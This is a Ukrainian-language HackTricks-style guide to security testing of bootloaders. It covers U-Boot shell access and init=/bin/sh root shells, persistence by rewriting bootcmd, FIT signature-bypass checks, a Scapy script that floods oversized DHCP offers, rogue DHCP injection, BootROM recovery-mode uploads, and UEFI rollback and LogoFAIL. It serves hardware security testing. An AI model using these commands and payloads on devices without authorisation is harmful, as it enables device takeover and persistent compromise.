# Тестування завантажувача

{{#include ../../banners/hacktricks-training.md}}

Рекомендовані кроки для зміни конфігурацій запуску пристрою та тестування bootloader-ів, таких як U-Boot та UEFI-класні завантажувачі. Зосередьтеся на отриманні раннього виконання коду, оцінці захисту підписом/відкату, та зловживанні шляхами відновлення або мережевого завантаження.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot — швидкі трюки та зловживання середовищем

1. Доступ до інтерпретатора shell
- Під час завантаження натисніть відомий клавішу переривання (часто будь-яку клавішу, 0, пробіл або специфічну для плати "magic" послідовність) перед виконанням `bootcmd`, щоб потрапити в U-Boot prompt.

2. Перевірка стану завантаження та змінних
- Корисні команди:
- `printenv` (дамп environment)
- `bdinfo` (інфо плати, адреси пам'яті)
- `help bootm; help booti; help bootz` (підтримувані методи завантаження kernel)
- `help ext4load; help fatload; help tftpboot` (доступні загрузчики)

3. Змінити аргументи завантаження, щоб отримати root shell
- Додайте `init=/bin/sh`, щоб kernel відкрив shell замість звичайного init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Завантаження по мережі з вашого TFTP-сервера
- Налаштуйте мережу і завантажте kernel/fit image з LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Збереження змін через environment
- Якщо сховище env не захищене від запису, можна зберегти контроль:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Перевірте змінні як `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, що впливають на fallback-шляхи. Неправильні значення можуть дозволити повторні переривання у shell.

6. Перевірте debug/небезпечні фічі
- Шукайте: `bootdelay` > 0, `autoboot` відключений, ненаділений `usb start; fatload usb 0:1 ...`, можливість `loady`/`loads` через serial, `env import` з ненадійних носіїв, та kernels/ramdisks, що завантажуються без перевірки підпису.

7. Тестування валідації U-Boot image/verification
- Якщо платформа заявляє secure/verified boot з FIT images, спробуйте як unsigned, так і змінені образи:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Відсутність `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` або старого поведінки `verify=n` часто дозволяє завантажувати довільні payload-и.

## Поверхня мережевого завантаження (DHCP/PXE) та rogue сервери

8. Fuzzing параметрів PXE/DHCP
- У старій реалізації BOOTP/DHCP в U-Boot були проблеми з безпекою пам'яті. Наприклад, CVE‑2024‑42040 описує витік пам'яті через crafted DHCP-відповіді, які можуть leak байти з пам'яті U-Boot назад по мережі. Проганяйте DHCP/PXE кодові шляхи з наддовгими/граничними значеннями (option 67 bootfile-name, vendor options, file/servername fields) і спостерігайте за зависаннями/leak-ами.
- Мінімальний Scapy-сніпет для навантаження параметрів завантаження по мережі:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Також перевірте, чи поля PXE filename передаються в shell/loader логіку без санації, коли вони далі пов'язуються з OS-side provisioning скриптами.

9. Тестування ін’єкції команд через rogue DHCP сервер
- Розгорніть rogue DHCP/PXE сервіс і спробуйте інжектити символи в поля filename або options, щоб дістатися до інтерпретаторів команд на пізніших етапах ланцюжка завантаження. Metasploit’s DHCP auxiliary, `dnsmasq`, або кастомні Scapy скрипти добре підходять. Обов'язково ізолюйте лабораторну мережу.

## Режими відновлення BootROM SoC, що обходять нормальне завантаження

Багато SoC мають BootROM "loader" режим, що приймає код по USB/UART навіть коли flash images некоректні. Якщо secure-boot fuses не перепечені (не згоріли), це може надати довільне виконання коду дуже рано в ланцюжку.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Оцініть, чи пристрій має secure-boot eFuses/OTP перепалені. Якщо ні, BootROM download режими часто обходять будь-яку вищерівневу валідацію (U-Boot, kernel, rootfs), виконуючи ваш first-stage payload безпосередньо з SRAM/DRAM.

## UEFI/PC-class bootloaders: швидкі перевірки

10. Маніпуляції ESP та тестування rollback
- Змонтуйте EFI System Partition (ESP) і перевірте наявність компонентів завантажувача: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, шляхи до vendor logo.
- Спробуйте завантажитися з пониженими або відомими вразливими підписаними компонентами, якщо Secure Boot revocations (dbx) не актуальні. Якщо платформа все ще довіряє старим shim/bootmanager-ам, часто можна підвантажити власний kernel або `grub.cfg` з ESP для отримання персистентності.

11. Баги парсингу boot logo (LogoFAIL клас)
- Декілька OEM/IBV firmware мали вразливості у парсингу зображень у DXE, що опрацьовують boot logos. Якщо атакувальник може помістити crafted image на ESP у vendor-специфічний шлях (наприклад, `\EFI\<vendor>\logo\*.bmp`) і перезавантажити, то можливе виконання коду під час раннього завантаження навіть з увімкненим Secure Boot. Перевірте, чи платформа приймає user-supplied logos і чи ці шляхи записувані з боку ОС.

## Аппаратна обережність

Будьте обережні при роботі з SPI/NAND flash під час раннього завантаження (наприклад, замикання контактів для обходу читання) та завжди консультуйтеся з datasheet флеш-пам'яті. Невчасні короткі замикання можуть пошкодити пристрій або програматор.

## Нотатки та додаткові поради

- Спробуйте `env export -t ${loadaddr}` та `env import -t ${loadaddr}` для переміщення environment blob-ів між RAM та сховищем; деякі платформи дозволяють імпортувати env з знімних носіїв без аутентифікації.
- Для персистентності на Linux-системах, що завантажуються через `extlinux.conf`, модифікація рядка `APPEND` (щоб вставити `init=/bin/sh` або `rd.break`) на boot-партіції часто достатня, якщо не застосовані перевірки підпису.
- Якщо userland надає `fw_printenv/fw_setenv`, перевірте, що `/etc/fw_env.config` відповідає реальному сховищу env. Неправильні offset-и дозволяють читати/писати не ту MTD-область.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
